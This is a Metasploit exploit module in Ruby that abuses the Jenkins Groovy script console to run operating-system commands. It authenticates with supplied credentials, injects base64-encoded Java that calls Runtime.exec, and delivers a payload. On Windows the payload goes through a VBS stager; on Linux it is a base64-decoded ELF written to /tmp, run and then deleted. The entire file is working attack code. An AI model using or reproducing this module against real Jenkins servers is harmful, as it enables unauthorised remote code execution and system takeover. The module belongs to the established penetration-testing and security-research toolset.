# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::CmdStagerVBS

	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039;Jenkins Script-Console Java Execution&#039;,
			&#039;Description&#039;    => %q{
					This module uses the Jenkins Groovy script console to execute
				OS commands using Java.
			},
			&#039;Author&#039;	=>
				[
					&#039;Spencer McIntyre&#039;,
					&#039;jamcut&#039;
				],
			&#039;License&#039;        => MSF_LICENSE,
			&#039;DefaultOptions&#039; =>
				{
					&#039;WfsDelay&#039; => &#039;10&#039;,
				},
			&#039;References&#039;     =>
				[
					[&#039;URL&#039;, &#039;https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Script+Console&#039;]
				],
			&#039;Targets&#039;		=>
				[
					[&#039;Windows&#039;,  {&#039;Arch&#039;  => ARCH_X86, &#039;Platform&#039; => &#039;win&#039;}],
					[&#039;Linux&#039;,    { &#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;linux&#039; }],
					[&#039;Unix CMD&#039;, {&#039;Arch&#039;  => ARCH_CMD, &#039;Platform&#039; => &#039;unix&#039;, &#039;Payload&#039; => {&#039;BadChars&#039; => "\x22"}}]
				],
			&#039;DisclosureDate&#039; => &#039;Jan 18 2013&#039;,
			&#039;DefaultTarget&#039;  => 0))

		register_options(
			[
				OptString.new(&#039;USERNAME&#039;,  [ false, &#039;The username to authenticate as&#039;, &#039;&#039; ]),
				OptString.new(&#039;PASSWORD&#039;,  [ false, &#039;The password for the specified username&#039;, &#039;&#039; ]),
				OptString.new(&#039;TARGETURI&#039;, [ true,  &#039;The path to jenkins&#039;, &#039;/jenkins/&#039; ]),
			], self.class)
	end

	def check
		uri = target_uri
		uri.path = normalize_uri(uri.path)
		uri.path << "/" if uri.path[-1, 1] != "/"
		res = send_request_cgi({&#039;uri&#039; => "#{uri.path}login"})
		if res and res.headers.include?(&#039;X-Jenkins&#039;)
			return Exploit::CheckCode::Detected
		else
			return Exploit::CheckCode::Safe
		end
	end

	def on_new_session(client)
		if not @to_delete.nil?
			print_warning("Deleting #{@to_delete} payload file")
			execute_command("rm #{@to_delete}")
		end
	end

	def http_send_command(cmd, opts = {})
		request_parameters = {
			&#039;method&#039;    => &#039;POST&#039;,
			&#039;uri&#039;       => "#{@uri.path}script",
			&#039;vars_post&#039; =>
				{
					&#039;script&#039; => java_craft_runtime_exec(cmd),
					&#039;Submit&#039; => &#039;Run&#039;
				}
		}
		request_parameters[&#039;cookie&#039;] = @cookie if @cookie != nil
		res = send_request_cgi(request_parameters)
		if not (res and res.code == 200)
			fail_with(Exploit::Failure::Unknown, &#039;Failed to execute the command.&#039;)
		end
	end

	def java_craft_runtime_exec(cmd)
		decoder = Rex::Text.rand_text_alpha(5, 8)
		decoded_bytes = Rex::Text.rand_text_alpha(5, 8)
		cmd_array = Rex::Text.rand_text_alpha(5, 8)
		jcode =  "sun.misc.BASE64Decoder #{decoder} = new sun.misc.BASE64Decoder();\n"
		jcode << "byte[] #{decoded_bytes} = #{decoder}.decodeBuffer(\"#{Rex::Text.encode_base64(cmd)}\");\n"

		jcode << "String [] #{cmd_array} = new String[3];\n"
		if target[&#039;Platform&#039;] == &#039;win&#039;
			jcode << "#{cmd_array}[0] = \"cmd.exe\";\n"
			jcode << "#{cmd_array}[1] = \"/c\";\n"
		else
			jcode << "#{cmd_array}[0] = \"/bin/sh\";\n"
			jcode << "#{cmd_array}[1] = \"-c\";\n"
		end
		jcode << "#{cmd_array}[2] = new String(#{decoded_bytes}, \"UTF-8\");\n"
		jcode << "Runtime.getRuntime().exec(#{cmd_array});\n"
		jcode
	end

	def execute_command(cmd, opts = {})
		vprint_status("Attempting to execute: #{cmd}")
		http_send_command("#{cmd}")
	end

	def linux_stager
		cmds = "echo LINE | tee FILE"
		exe = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
		base64 = Rex::Text.encode_base64(exe)
		base64.gsub!(/\=/, "\\u003d")
		file = rand_text_alphanumeric(4+rand(4))

		execute_command("touch /tmp/#{file}.b64")
		cmds.gsub!(/FILE/, "/tmp/" + file + ".b64")
		base64.each_line do |line|
			line.chomp!
			cmd = cmds
			cmd.gsub!(/LINE/, line)
			execute_command(cmds)
		end

		execute_command("base64 -d /tmp/#{file}.b64|tee /tmp/#{file}")
		execute_command("chmod +x /tmp/#{file}")
		execute_command("rm /tmp/#{file}.b64")

		execute_command("/tmp/#{file}")
		@to_delete = "/tmp/#{file}"
	end


	def exploit
		@uri = target_uri
		@uri.path = normalize_uri(@uri.path)
		@uri.path << "/" if @uri.path[-1, 1] != "/"
		print_status(&#039;Checking access to the script console&#039;)
		res = send_request_cgi({&#039;uri&#039; => "#{@uri.path}script"})
		fail_with(Exploit::Failure::Unknown) if not res

		@cookie = nil
		if res.code != 200
			print_status(&#039;Logging in...&#039;)
			res = send_request_cgi({
				&#039;method&#039;    => &#039;POST&#039;,
				&#039;uri&#039;       => "#{@uri.path}j_acegi_security_check",
				&#039;vars_post&#039; =>
					{
						&#039;j_username&#039; => Rex::Text.uri_encode(datastore[&#039;USERNAME&#039;], &#039;hex-normal&#039;),
						&#039;j_password&#039; => Rex::Text.uri_encode(datastore[&#039;PASSWORD&#039;], &#039;hex-normal&#039;),
						&#039;Submit&#039;     => &#039;log in&#039;
					}
			})

			if not (res and res.code == 302) or res.headers[&#039;Location&#039;] =~ /loginError/
				fail_with(Exploit::Failure::NoAccess, &#039;login failed&#039;)
			end
			sessionid = &#039;JSESSIONID&#039; << res.headers[&#039;set-cookie&#039;].split(&#039;JSESSIONID&#039;)[1].split(&#039;; &#039;)[0]
			@cookie = "#{sessionid}"
		else
			print_status(&#039;No authentication required, skipping login...&#039;)
		end

		case target[&#039;Platform&#039;]
		when &#039;win&#039;
			print_status("#{rhost}:#{rport} - Sending VBS stager...")
			execute_cmdstager({:linemax => 2049})
		when &#039;unix&#039;
			print_status("#{rhost}:#{rport} - Sending payload...")
			http_send_command("#{payload.encoded}")
		when &#039;linux&#039;
			print_status("#{rhost}:#{rport} - Sending Linux stager...")
			linux_stager
		end

		handler
	end
end

